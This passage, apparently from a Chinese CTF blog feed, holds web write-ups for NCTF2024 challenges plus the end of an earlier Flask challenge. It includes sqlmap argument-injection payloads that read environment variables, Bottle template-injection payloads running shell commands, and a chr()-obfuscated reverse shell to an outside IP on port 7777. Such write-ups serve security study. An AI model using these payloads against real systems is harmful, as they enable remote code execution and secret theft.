punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('</span><span class="token interpolation"><span class="token punctuation">{</span>code<span class="token punctuation">}</span></span><span class="token string">')))))))"</span></span><span class="token punctuation">)</span>        found <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span> <span class="token keyword">if</span> found <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/1337'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>remote_addr <span class="token operator">==</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token string">'abcdefghi'</span><span class="token punctuation">:</span>            req <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                req <span class="token operator">=</span> binary_to_string<span class="token punctuation">(</span>req<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                req <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid JSON"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> req<span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Empty Person's name"</span><span class="token punctuation">)</span>            name <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">6</span><span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Too long"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'\''</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"NO '"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">')'</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"NO )"</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""            Some waf hidden here ;)            """</span>            fate <span class="token operator">=</span> db_search<span class="token punctuation">(</span>name<span class="token punctuation">)</span>            <span class="token keyword">if</span> fate <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token string">"No such Person"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'Fate'</span><span class="token punctuation">:</span> fate<span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Hello local, and hello hacker"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token string">"Only local access allowed"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""CREATE TABLE FATETABLE (  NAME TEXT NOT NULL,  FATE TEXT NOT NULL);"""</span><span class="token punctuation">)</span>Fate <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">'JOHN'</span><span class="token punctuation">,</span> <span class="token string">'1994-2030 Dead in a car accident'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'JANE'</span><span class="token punctuation">,</span> <span class="token string">'1990-2025 Lost in a fire'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'SARAH'</span><span class="token punctuation">,</span> <span class="token string">'1982-2017 Fired by a government official'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'DANIEL'</span><span class="token punctuation">,</span> <span class="token string">'1978-2013 Murdered by a police officer'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'LUKE'</span><span class="token punctuation">,</span> <span class="token string">'1974-2010 Assassinated by a military officer'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'KAREN'</span><span class="token punctuation">,</span> <span class="token string">'1970-2006 Fallen from a cliff'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'BRIAN'</span><span class="token punctuation">,</span> <span class="token string">'1966-2002 Drowned in a river'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'ANNA'</span><span class="token punctuation">,</span> <span class="token string">'1962-1998 Killed by a bomb'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'JACOB'</span><span class="token punctuation">,</span> <span class="token string">'1954-1990 Lost in a plane crash'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">'LAMENTXU'</span><span class="token punctuation">,</span> <span class="token string">r'2024 Send you a flag flag{FAKE}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>conn<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span><span class="token string">"INSERT INTO FATETABLE VALUES (?, ?)"</span><span class="token punctuation">,</span> Fate<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nctf</title>
      <link href="/2025/03/30/2025.3.23/"/>
      <url>/2025/03/30/2025.3.23/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/X1cT34m/NCTF2024/blob/main/Writeup/Web.md">NCTF2024/Writeup/Web.md at main · X1cT34m/NCTF2024</a></p><p>插一嘴，我打算29号复现，结果记错时间环境28号就关了，holy shit（哀嚎ing）<del>所以大家一定要记时间啊</del></p><h3 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aeeb780c2bba606ef2f45dd3cb5af7d2.png"></p><p><a href="https://cloud.tencent.com/developer/article/2457063">CTF - Python 沙箱绕过与任意命令执行技巧-腾讯云开发者社区-腾讯云</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>            command<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>            shell<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意这里参数的值不需要加上单双引号, 因为上面已经设置了 <code>shell=False</code>(后面的所有内容都是当成参数看待的), 如果加上去反而代表的是 “eval 一个 Python 字符串”</p><p>当 <code>shell</code> 参数设置为 <code>False</code> 时，<code>subprocess.Popen</code> 会直接调用操作系统的底层函数来执行命令，而不经过 shell 环境。</p><p>当 <code>shell</code> 参数设置为 <code>True</code> 时，<code>subprocess.Popen</code> 会通过 shell 来执行命令，这意味着命令会在一个 shell 环境中被解析和执行。可以使用 shell 的各种特性，如通配符（<code>*</code>、<code>?</code>）、重定向（<code>&gt;</code>、<code>&lt;</code>）、管道（<code>|</code>）等。例如，执行 <code>ls *.py</code> 可以列出当前目录下所有以 <code>.py</code> 结尾的文件。</p><p><a href="https://www.iteye.com/blog/cherishlc-2430569">https://www.iteye.com/blog/cherishlc-2430569</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ac2a46f47da13289d4a6f93a0a443d8e.png"></p><p>可以实行。</p><p>没找见</p><pre class="line-numbers language-none"><code class="language-none">http://39.106.16.204:23497/ --eval __import__("os").system("env")or127.0.0.1 --eval=print(__import__('os').popen('env').read())orhttps://localhost?id=1&amp;search=1 -c /proc/self/environnctf{4851e699-1554-47fc-ab4f-2b27f841f3a7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ez-dash（-revenge）"><a href="#ez-dash（-revenge）" class="headerlink" title="ez_dash（_revenge）"></a>ez_dash（_revenge）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''Hints: Flag在环境变量中'''</span><span class="token keyword">from</span> typing <span class="token keyword">import</span> Optional<span class="token keyword">import</span> pydash<span class="token keyword">import</span> bottle__forbidden_path__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'__annotations__'</span><span class="token punctuation">,</span> <span class="token string">'__call__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__closure__'</span><span class="token punctuation">,</span>               <span class="token string">'__code__'</span><span class="token punctuation">,</span> <span class="token string">'__defaults__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span>               <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span>               <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__get__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span>               <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span>               <span class="token string">'__kwdefaults__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span>               <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__qualname__'</span><span class="token punctuation">,</span>               <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span>               <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'__wrapped__'</span><span class="token punctuation">,</span>               <span class="token string">"Optional"</span><span class="token punctuation">,</span><span class="token string">"func"</span><span class="token punctuation">,</span><span class="token string">"render"</span><span class="token punctuation">,</span>               <span class="token punctuation">]</span>__forbidden_name__<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token string">"bottle"</span><span class="token punctuation">]</span>__forbidden_name__<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setval</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span> Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> name<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> __forbidden_name__<span class="token punctuation">:</span>        <span class="token keyword">if</span> name<span class="token operator">==</span>word<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> __forbidden_path__<span class="token punctuation">:</span>        <span class="token keyword">if</span> path<span class="token punctuation">.</span>find<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>    obj<span class="token operator">=</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token comment">#obj=globals()[name]：从全局命名空间中获取名为 name 的对象。</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>obj<span class="token punctuation">,</span>path<span class="token punctuation">,</span>value<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@bottle<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/setValue'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> bottle<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    path<span class="token operator">=</span>bottle<span class="token punctuation">.</span>request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"no"</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">6</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"no"</span>    value<span class="token operator">=</span>bottle<span class="token punctuation">.</span>request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"yes"</span> <span class="token keyword">if</span> setval<span class="token punctuation">(</span>name<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"no"</span><span class="token decorator annotation punctuation">@bottle<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">'/render'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path<span class="token operator">=</span>bottle<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> path<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span> <span class="token keyword">or</span> path<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span> <span class="token keyword">or</span> path<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Hacker"</span>    <span class="token keyword">return</span> bottle<span class="token punctuation">.</span>template<span class="token punctuation">(</span>path<span class="token punctuation">)</span>bottle<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>非预期：</p><p><code>/render?path=%print(1)</code>空白；<del>熟悉的味道（</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cc3cfb29ac910fa1b973256852a25e12.png"></p><p>测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">%</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id&gt;1')"</span><span class="token punctuation">)</span>?path<span class="token operator">=</span><span class="token operator">%</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os')"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"popen('id&gt;1')"</span><span class="token punctuation">)</span>?path<span class="token operator">=</span><span class="token number">1</span>  <span class="token operator">-</span><span class="token operator">&gt;</span>ok?path<span class="token operator">=</span><span class="token operator">%</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os')"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"popen('env&gt;2')"</span><span class="token punctuation">)</span>?path<span class="token operator">=</span><span class="token number">2</span>  <span class="token operator">-</span><span class="token operator">&gt;</span>flag<span class="token comment">#渲染的时候写入同一个文件渲染的时候还是上次的结果，只能写进新文件了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or abort回显</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#abort 函数用于在处理请求时，中断当前操作并返回指定的 HTTP 错误状态码和错误信息。</span><span class="token comment">#subprocess 模块可让你创建新的进程，连接到它们的输入 / 输出 / 错误管道，并获取它们的返回码。getoutput 函数能够执行系统命令并返回命令的输出结果。</span><span class="token keyword">from</span> bottle <span class="token keyword">import</span> abort<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> getoutputa <span class="token operator">=</span> getoutput<span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">)</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token comment"># 404 错误响应换成看系统的环境变量信息</span><span class="token operator">/</span>render?path<span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">%</span>20from<span class="token operator">%</span>20bottle<span class="token operator">%</span>20import<span class="token operator">%</span>20abort<span class="token operator">%</span>0afrom<span class="token operator">%</span>20subprocess<span class="token operator">%</span>20import<span class="token operator">%</span>20getoutput<span class="token operator">%</span> 0aa<span class="token operator">=</span>getoutput<span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">)</span><span class="token operator">%</span>0aabort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">convert_to_chr_expression</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""将输入字符串转换为chr代码拼接形式"""</span>    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> text<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span> <span class="token keyword">if</span> text <span class="token keyword">else</span> <span class="token string">""</span><span class="token comment"># 获取输入并处理</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token string">'bash -c "bash -i &gt;&amp; /dev/tcp/8.140.217.166/7777 0&gt;&amp;1"'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>convert_to_chr_expression<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>bash <span class="token operator">-</span>c <span class="token string">"bash -i &gt;&amp; /dev/tcp/8.140.217.166/7777 0&gt;&amp;1"</span><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'sy'</span><span class="token operator">+</span><span class="token string">'stem'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token 